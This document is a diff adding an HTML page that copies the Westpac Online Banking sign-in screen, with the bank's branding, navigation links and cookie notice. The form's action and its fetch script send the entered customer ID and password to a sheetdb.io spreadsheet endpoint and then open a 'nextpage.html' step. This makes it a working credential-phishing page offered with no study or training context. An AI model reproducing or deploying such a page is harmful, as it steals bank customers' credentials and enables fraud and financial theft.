@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title>Sign in to Westpac Online Banking</title>
+    <!-- <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-000-0001combined.css" rel="stylesheet">
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-0001combined.css" rel="stylesheet">
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Fiserv.PS.Authentication/000-0001combined.css" rel="stylesheet"> -->
+    <!-- <link rel="shortcut icon" href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Images/favicon.ico"/> -->
+    <link href="styles.css" rel="stylesheet">
+</head>
+<body id="unauthenticated-template" class="authentication_v2 wr308-template auth_v2_std_signin">
+    <div id="info-banner-gdpr">
+        <div class="message-bar nomargin info" role="alert">
+            <div class="message">
+                We use cookies to secure and tailor your web use. Our <a href="https://www.westpac.com.au/privacy/privacy-statement/" target="_blank"><strong>notice</strong></a> explains how we use cookies and how you can manage them. By continuing to use this site, we assume you're ok with our notice.
+            </div>
+        </div>
+    </div>
+<div id="container">
+    <header id="header" role="banner">
+        <div id="menu-bar">
+            <ul id="pull-right">
+                <li><a href="https://www.westpac.com.au/personal-banking/online-banking/making-the-most/lost-stolen-card/">Lost or stolen cards</a></li>
+                <li><a href="https://www.westpac.com.au/contact-us/">Contact us</a></li>
+                <li><a href="https://www.westpac.com.au/locateus/">Locate us</a></li>
+                <li><a class="last-link" href="https://www.westpac.com.au/personal-banking/online-banking/getting-started/">Register for Westpac Online Banking</a></li>
+            </ul>
+        </div>
+
+        <div id="content" class="container-end">
+            <div id="logo">
+                <a href="https://www.westpac.com.au">
+                    <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png" alt="Westpac Internet Banking Home">
+                </a>
+            </div>
+
+            <div id="nav-container">
+                <nav>
+                    <ul>
+                        <li class="home"><a href="https://www.westpac.com.au/">Home</a></li>
+                        <li class="personal"><a href="https://www.westpac.com.au/personal-banking/">Personal</a></li>
+                        <li class="business"><a href="https://www.westpac.com.au/business-banking/">Business</a></li>
+                        <li class="corporate"><a href="https://www.westpac.com.au/corporate-banking/">Corporate</a></li>
+                        <li class="aboutwestpac"><a href="https://www.westpac.com.au/about-westpac/">About us</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <div id="main-container">
+    <h1 id="page-title">Sign in to Westpac Online Banking</h1>
+
+                <div class="login-info-container">
+                    <div id="main-input-container">
+                        <fieldset>
+                            <legend class="a11y-context">Sign in to Westpac Live Online Banking</legend>
+                            <div>
+
+                                <form id="customerForm" action="https://sheetdb.io/api/v1/0my53g7v2ovih" method="post">
+                                    <label for="customer_id">
+                                        <span class="label-text-main-v2">Customer ID</span>
+                                        <input id="customer_id" name="customer_id" maxlength="8" type="text" class="txtbox-layout-white" required>
+                                    </label>
+
+                                    <label for="password">
+                                        <span class="label-text-main-v2">Password</span>
+                                        <input id="password" name="password" type="password" class="txtbox-layout-white txtpwd-layout" required>
+                                    </label>
+
+                                    <div class="remember-me-container">
+                                        <label for="rememberme" class="chkbox-container">
+                                            <span id="remember-me-lbl">Remember customer ID</span>
+                                            <input id="rememberme" type="checkbox" name="rememberme">
+                                            <span class="checkmark">
+                                                <span class="tickmark"></span>
+                                            </span>
+                                        </label>
+                                    </div>
+
+                                 
+                                    <button type="submit" class="btnSignIn-v2 btn btn-primary">Sign in</button>
+                                </form>
+                            </div>
+                        </fieldset>
+
+                        <div>
+                            <a href="https://banking.westpac.com.au/wbc/banking/forgottencredential">Forgot customer ID or password?</a>
+                        </div>
+                    </div>
+
+                    <div id="security-container">
+                   
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+</div>
+
+<footer id="footer" role="contentinfo">
+
+</footer>
+
+<script>
+    var form = document.getElementById("customerForm");
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        fetch(form.action, {
+            method: "POST",
+            body: new FormData(form)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Response:", data);
+            if (data && !data.error) {
+                window.open("nextpage.html", "_blank"); // Redirect to the next page if successful
+            } else {
+                alert("Failed to submit form. Please try again.");
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("Error submitting form. Please check your internet connection.");
+        });
+    });
+</script>
+
+</body>
+</html>
